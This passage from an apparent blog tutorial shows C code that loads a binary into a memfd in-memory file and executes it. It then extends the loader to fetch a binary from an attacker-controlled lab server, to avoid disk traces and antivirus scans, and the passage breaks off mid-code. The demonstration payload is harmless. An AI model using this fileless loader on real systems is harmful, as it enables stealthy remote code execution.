</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE         </span><span class="cm">/* See feature_test_macros(7) */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define BUFF_SIZE 1024
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Prints usage of the program - takes program name as argument - argv[0]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">usage</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">prog</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">use</span> <span class="o">=</span> <span class="s">&#34;USAGE: %1$s /path/to/binary arg_to_binary1 arg_to_binary2 ...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="n">use</span><span class="p">,</span> <span class="n">prog</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Prints error message and the error number message; exits with errno.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">die</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ - ] %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ ? ] %s&#34;</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="nf">exit</span><span class="p">(</span><span class="n">errno</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">fd1</span><span class="p">,</span> <span class="n">fd2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="n">BUFF_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="c1">// Creates a buffer with all values as 0;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>            <span class="c1">// Checks if any argument is passed or not.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">usage</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// Create mem file (fd1)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ * ] Trying to create a mem file...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">fd1</span> <span class="o">=</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="s">&#34;testfd&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">fd1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="nf">die</span><span class="p">(</span><span class="s">&#34;Can&#39;t create memfd file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ + ] Created mem file and attached to fd = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fd1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// Read a local binary (fd2) and write to mem file (fd1)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ * ] Reading %s file</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="n">fd2</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>       <span class="nf">die</span><span class="p">(</span><span class="s">&#34;Can&#39;t open file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s"> ----------------------------------- </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">read_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span> <span class="p">(</span><span class="n">read_count</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="n">BUFF_SIZE</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">write_count</span> <span class="o">=</span> <span class="nf">write</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="n">read_count</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nf">die</span><span class="p">(</span><span class="s">&#34;Failed to write to mem file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">i</span> <span class="o">+=</span> <span class="n">read_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">j</span> <span class="o">+=</span> <span class="n">write_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\r</span><span class="s">Read count = %6d  |  Write count = %3d&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s"> ----------------------------------- </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ + ] Starting execution...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// Change argv params; removes the argv[0]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// printf(&#34;%s %s %s %s\n&#34;, argv[0], argv[1], argv[2], argv[3]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">argc</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>  <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// printf(&#34;%s %s %s %s\n&#34;, argv[0], argv[1], argv[2], argv[3]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Execute fd1 - with new argv and same envp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">fexecve</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// If fexecve returns, then it is failed.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed Executing....</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">errno</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>We should give some time to understand this code on <strong>why</strong> and <strong>how</strong> it&rsquo;ll load <strong>what</strong> in memory.</p>
<p>We can compile this code to generate an ELF file with <code>gcc loader.c -o loader.o</code>; Once compiled, we can run it with <code>./loader.o</code></p>
<p>Since there are no arguments(<code>argc&lt;2</code>), it should fail with usage information on stdout.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">USAGE</span><span class="p">:</span> <span class="o">./</span><span class="n">loader</span><span class="o">.</span><span class="n">o</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">binary</span> <span class="n">arg_to_binary1</span> <span class="n">arg_to_binary2</span> <span class="o">...</span>
</span></span></code></pre></div><p>Let&rsquo;s try again with some arguments this time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">./</span><span class="n">loader</span><span class="o">.</span><span class="n">o</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">file</span> <span class="n">loader</span><span class="o">.</span><span class="n">o</span>
</span></span></code></pre></div><p>This time things will not be same as last time. It&rsquo;ll :-</p>
<ol>
<li>Creates an in-memory file and gets a file descriptor back (<code>fd1</code>).</li>
<li>Opens local binary file (argv[1] = <code>/usr/bin/file</code>); Stores this file descriptor in <code>fd2</code>.</li>
<li>Read-write loop until everything from <code>fd2</code> is written in <code>fd1</code>.</li>
<li>Change argv to be passed to in-mem file. The new argv value should look like &ndash;&gt; <code>/usr/bin/file arg1 arg2 arg3</code>. This means we just have to remove the argv[0] and set everything remaining in proper index values.</li>
<li>Execute <code>fd1</code> &ndash;&gt; in-memory file.</li>
</ol>
<p>Output:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">[</span> <span class="o">*</span> <span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">create</span> <span class="n">a</span> <span class="n">mem</span> <span class="n">file</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">+</span> <span class="p">]</span> <span class="n">Created</span> <span class="n">mem</span> <span class="n">file</span> <span class="ow">and</span> <span class="n">attached</span> <span class="n">to</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">*</span> <span class="p">]</span> <span class="n">Reading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">file</span> <span class="n">file</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="o">-----------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">Read</span> <span class="n">count</span> <span class="o">=</span>  <span class="mi">27104</span>  <span class="o">|</span>  <span class="n">Write</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">27104</span>
</span></span><span class="line"><span class="cl"> <span class="o">-----------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">+</span> <span class="p">]</span> <span class="n">Starting</span> <span class="n">execution</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">loader</span><span class="o">.</span><span class="n">o</span><span class="p">:</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">shared</span> <span class="n">object</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="mi">426</span><span class="n">a7743592788cd18c92a76f22ccfb632700d7b</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span><span class="p">,</span> <span class="n">with</span> <span class="n">debug_info</span><span class="p">,</span> <span class="ow">not</span> <span class="n">stripped</span>
</span></span></code></pre></div><p>Last line of the output is the proof that our in-memory file executed successfully&hellip; Now we can take it to next level.</p>
<h3 id="loading-binary-from-network">loading binary from network</h3>
<p>Till this point, we know how to write a basic code to load a local binary, create a in-mem file for it and then execute it.</p>
<p>But an attacker won&rsquo;t just use it run the local binaries which can be executed directly, instead he would like to execute a binary sitting on his server and load that into victim&rsquo;s system directly in memory. This will not be detected with the help of any disk analysis tool or commands like <code>ls</code>. Also, this will be executing safe from &ldquo;Anti-Virus&rdquo; software complete disk-scan features.
In theory, attacker could run anything from his system on victim&rsquo;s system without leaving any trace on harddisk.</p>
<p>To simulate this, I&rsquo;ve created a pre-setup with <strong>a server that hosts a malicious binary</strong> and victim&rsquo;s system where we have the <code>loader.o</code> present.</p>
<p>Without further ado, let&rsquo;s get things prepared for out test. We need 3 things:</p>
<ol>
<li>loader binary (on victim&rsquo;s machine)</li>
<li>malicious binary (on attacker&rsquo;s machine)</li>
<li>tcp socket server to host malicious binary (on attacker&rsquo;s machine)</li>
</ol>
<p>I started out with a (not so) malicious binary, which simply creates a plain-text file when executed.</p>
<p>Source Code: <code>malicious_program.c</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="s">&#34;This malicious program wishes you to have a good day!!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">FILE</span><span class="o">*</span> <span class="n">fPtr</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;NOTICE_for_U.txt&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">fPtr</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fputs</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">fPtr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fPtr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Compile it -&gt; <code>gcc malicious_program.c -o malicious_program.o</code></p>
<p>Next, I wrote a small python tcp socket server that will host the <code>malicious_program.o</code> binary.</p>
<p>Source Code: <code>python_server.py</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Read binary</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;malicious_program.o&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Host it on 192.168.56.56:1234</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;192.168.56.56&#39;</span><span class="p">,</span> <span class="mi">1234</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>   <span class="c1"># Prints the incoming Connection details</span>
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></div><p>Finally, we modify the previous local binary loader code to read from connected socket instead of a local binary.</p>
<p>Source code: <code>network_loader.c</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE         </span><span class="cm">/* See feature_test_macros(7) */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define BUFF_SIZE 1024
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">usage</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">prog</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">use</span> <span class="o">=</span> <span class="s">&#34;USAGE: %1$s Destination Port ...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="n">use</span><span class="p">,</span> <span class="n">prog</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">die</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ - ] %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ ? ] %s&#34;</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="nf">exit</span><span class="p">(</span><span class="n">errno</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="n">BUFF_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  	<span class="nf">usage</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  	<span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Create mem file (fd1)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ * ] Trying to create a mem file...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">fd1</span> <span class="o">=</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="s">&#34;testfd&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="nf">die</span><span class="p">(</span><span class="s">&#34;Can&#39;t create memfd file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ + ] Created mem file and attached to fd = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fd1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Socket stuff begins here
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serv_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">sock</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">sock</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">die</span><span class="p">(</span><span class="s">&#34;Socket not created&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="nf">htons</span><span class="p">(</span><span class="nf">strtol</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">10</span><span class="p">));</span>   <span class="c1">// set port
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nf">inet_pton</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">// set address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">die</span><span class="p">(</span><span class="s">&#34;Invalid address&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// connect
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">die</span><span class="p">(</span><span class="s">&#34;Connection failed&#34;</span><span class="p">);</span>
